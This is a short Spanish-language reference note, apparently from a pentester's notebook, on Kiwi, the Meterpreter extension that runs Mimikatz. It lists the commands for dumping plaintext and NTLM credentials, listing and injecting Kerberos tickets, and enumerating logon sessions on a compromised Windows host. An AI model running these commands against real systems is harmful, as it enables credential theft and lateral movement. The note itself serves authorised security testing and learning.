
# 🐥 Kiwi - Mimikatz embebido en Meterpreter

**Kiwi** es una extensión de Meterpreter que permite utilizar funcionalidades de [Mimikatz](mimikatz.md) directamente desde una sesión de **Metasploit**, sin necesidad de subir binarios ni ejecutar herramientas externas.

---

## 🎯 ¿Qué permite hacer?

Una vez cargada la extensión, te brinda comandos similares a los de Mimikatz para:

- Extraer credenciales (plaintext, NTLM, LM, SHA1)
- Volcar credenciales de sistemas Kerberos
- Inyectar tickets Kerberos
- Enumerar sesiones y usuarios conectados
- Elevar privilegios o duplicar tokens

---

## 🚀 ¿Cómo se usa?

1. **Desde una sesión de `meterpreter`:**

```bash
meterpreter > load kiwi
````

2. **Extraer todas las credenciales (como en la imagen):**
    

```bash
meterpreter > creds_all
```

3. **Listar usuarios conectados:**
    

```bash
meterpreter > kiwi_cmd sekurlsa::logonpasswords
```

---

## 📌 Comandos útiles

|Comando|Descripción|
|---|---|
|`load kiwi`|Carga la extensión|
|`creds_all`|Extrae credenciales de todas las fuentes|
|`kiwi_cmd sekurlsa::logonpasswords`|Ejecuta Mimikatz desde Meterpreter|
|`kiwi_cmd kerberos::list`|Lista tickets Kerberos|
|`kiwi_cmd kerberos::ptt`|Inyecta tickets|
|`kiwi_cmd sekurlsa::tickets`|Muestra tickets activos|

---

## 🔐 Requisitos

- Acceso como **Administrador** o **SYSTEM**
    
- Tener una sesión **Meterpreter activa** (ideal: `windows/x64/meterpreter/reverse_tcp`)
    

---

> 🛑 **Nota legal:** El uso de Kiwi está limitado a entornos controlados con consentimiento explícito. Utilizarlo sin autorización es ilegal.

[[herramientas]]